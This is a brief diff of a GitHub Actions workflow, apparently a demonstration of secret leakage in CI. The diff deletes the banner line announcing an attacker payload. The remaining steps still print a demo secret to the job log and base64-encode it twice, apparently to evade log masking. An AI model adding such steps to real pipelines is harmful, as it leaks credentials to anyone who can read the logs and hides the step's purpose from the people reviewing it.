@@ -20,7 +20,7 @@ jobs:
         shell: bash
         run: |
           echo ""
-          echo "===== ATTACKER PAYLOAD ACTIVÉ ====="
+         
           echo "[Attacker] Secret en clair : $DEMO_SECRET"
           echo ""
           encoded=$(echo -n "$DEMO_SECRET" | base64 | base64)
